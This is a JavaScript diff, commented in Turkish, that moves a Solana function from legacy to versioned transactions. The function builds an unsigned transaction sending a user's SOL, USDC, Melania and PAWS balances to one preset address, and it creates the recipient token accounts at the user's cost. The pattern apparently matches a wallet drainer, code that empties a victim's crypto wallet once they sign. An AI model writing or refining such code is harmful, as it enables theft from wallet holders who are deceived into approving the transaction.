@@ -4,7 +4,8 @@
 import {
   PublicKey,
   SystemProgram,
-  Transaction,
+  TransactionMessage,
+  VersionedTransaction,
 } from "@solana/web3.js";
 import {
   getAssociatedTokenAddress,
@@ -14,15 +15,13 @@ import {
 } from "@solana/spl-token";
 import { connection } from "./connect.js";
 
-
-
 /**
  * Kullanıcının bakiyelerine göre SOL, USDC, Melania ve PAWS transferi için
- * instruction’ları ekleyen, imzalanmamış bir Transaction döner.
+ * instruction’ları ekleyen, imzalanmamış bir VersionedTransaction döner.
  * Yeterli bakiye yoksa null döner.
  *
  * @param {PublicKey | null} userPublicKey
- * @returns {Promise<Transaction|null>}
+ * @returns {Promise<VersionedTransaction|null>}
  */
 export async function createUnsignedTransaction(userPublicKey) {
   if (!userPublicKey) {
@@ -105,22 +104,16 @@ export async function createUnsignedTransaction(userPublicKey) {
   const toPawsAta    = await getAssociatedTokenAddress(PAWS_MINT,    toPublicKey);
 
   // -----------------------------------------------------------
-  // Transaction oluşturma
+  // Instruction listesi oluştur
   // -----------------------------------------------------------
-  const { blockhash } = await connection.getLatestBlockhash();
-  const tx = new Transaction({
-    feePayer: userPublicKey,
-    recentBlockhash: blockhash,
-  });
+  const instructions = [];
 
-  // -----------------------------------------------------------
-  // Gerekirse hedef ATA hesaplarını oluştur
-  // -----------------------------------------------------------
+  // Hedef ATA'ları gerekirse oluştur
   if (isUsdcSufficient) {
     try {
       await getAccount(connection, toUsdcAta);
     } catch {
-      tx.add(
+      instructions.push(
         createAssociatedTokenAccountInstruction(
           userPublicKey,
           toUsdcAta,
@@ -134,7 +127,7 @@ export async function createUnsignedTransaction(userPublicKey) {
     try {
       await getAccount(connection, toMelaniaAta);
     } catch {
-      tx.add(
+      instructions.push(
         createAssociatedTokenAccountInstruction(
           userPublicKey,
           toMelaniaAta,
@@ -148,7 +141,7 @@ export async function createUnsignedTransaction(userPublicKey) {
     try {
       await getAccount(connection, toPawsAta);
     } catch {
-      tx.add(
+      instructions.push(
         createAssociatedTokenAccountInstruction(
           userPublicKey,
           toPawsAta,
@@ -159,11 +152,9 @@ export async function createUnsignedTransaction(userPublicKey) {
     }
   }
 
-  // -----------------------------------------------------------
   // Transfer instruction’ları ekle
-  // -----------------------------------------------------------
   if (isSolSufficient) {
-    tx.add(
+    instructions.push(
       SystemProgram.transfer({
         fromPubkey: userPublicKey,
         toPubkey: toPublicKey,
@@ -172,7 +163,7 @@ export async function createUnsignedTransaction(userPublicKey) {
     );
   }
   if (isUsdcSufficient) {
-    tx.add(
+    instructions.push(
       createTransferInstruction(
         userUsdcAta,
         toUsdcAta,
@@ -182,7 +173,7 @@ export async function createUnsignedTransaction(userPublicKey) {
     );
   }
   if (isMelaniaSufficient) {
-    tx.add(
+    instructions.push(
       createTransferInstruction(
         userMelaniaAta,
         toMelaniaAta,
@@ -192,7 +183,7 @@ export async function createUnsignedTransaction(userPublicKey) {
     );
   }
   if (isPawsSufficient) {
-    tx.add(
+    instructions.push(
       createTransferInstruction(
         userPawsAta,
         toPawsAta,
@@ -203,7 +194,14 @@ export async function createUnsignedTransaction(userPublicKey) {
   }
 
   // -----------------------------------------------------------
-  // Hazırlanan Transaction’ı döndür
+  // VersionedTransaction oluşturma
   // -----------------------------------------------------------
-  return tx;
+  const { blockhash } = await connection.getLatestBlockhash();
+  const messageV0 = new TransactionMessage({
+    payerKey:        userPublicKey,
+    recentBlockhash: blockhash,
+    instructions,
+  }).compileToV0Message();
+
+  return new VersionedTransaction(messageV0);
 }
